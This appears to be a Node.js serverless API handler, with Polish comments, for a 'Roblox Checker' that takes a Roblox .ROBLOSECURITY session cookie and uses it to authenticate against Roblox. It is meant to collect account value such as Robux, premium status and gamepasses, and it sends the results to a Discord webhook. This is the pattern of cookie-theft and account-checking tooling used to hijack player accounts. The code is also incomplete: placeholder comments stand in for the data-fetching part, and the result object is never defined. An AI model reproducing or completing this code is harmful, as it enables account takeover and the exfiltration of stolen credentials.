// Dodajemy to na samym samym początku pliku – przed export default
export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST is allowed' });

  const { cookie } = req.body || {};

  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  // Używamy dokładnie tej nazwy, którą masz w Vercel
  const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';

  if (!DISCORD_WEBHOOK) {
    console.log("Brak zmiennej DISCORD_WEBHOOK – sprawdzamy co jest w process.env:");
    console.log(Object.keys(process.env).filter(key => key.includes('DISCORD') || key.includes('WEBHOOK') || key.includes('HOOK')));
  }

  try {
    // 1. CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json',
      },
    });

    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    // reszta Twojego kodu (userData, premium, robux, age, avatar, gamepasy) – wklej swoją resztę tutaj bez zmian

    // ... (tu wstaw cały swój kod od pobierania userData aż do const result = { ... })

    // Wysyłka do Discorda
    if (DISCORD_WEBHOOK) {
      try {
        const embed = {
          title: `${result.username} ・ ${result.displayName}`,
          description: `**User ID:** ${result.userId}\n**Wiek konta:** ${result.accountAgeDays} dni`,
          color: result.hasPremium ? 0x00AAFF : 0xAAAAAA,
          fields: [
            { name: "Robux", value: result.robux.toLocaleString(), inline: true },
            { name: "Premium", value: result.hasPremium ? "Tak" : "Nie", inline: true },
            { name: "Email Verified", value: result.emailVerified ? "Tak" : "Nie", inline: true },
          ],
          thumbnail: { url: result.avatarUrl || "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=720&height=720&format=png" },
          footer: { text: `Cookie → ${cookie.slice(0, 8)}...${cookie.slice(-6)}` },
          timestamp: new Date().toISOString(),
        };

        if (result.hasGamePasses?.length > 0) {
          embed.fields.push({
            name: "Gamepasy",
            value: result.hasGamePasses.join(", "),
            inline: false
          });
        }

        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: "Roblox Checker",
            avatar_url: "https://i.imgur.com/4M34hi2.png",
            embeds: [embed]
          })
        });
      } catch (err) {
        console.error("Błąd Discorda:", err.message);
      }
    }

    res.status(200).json(result);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
}
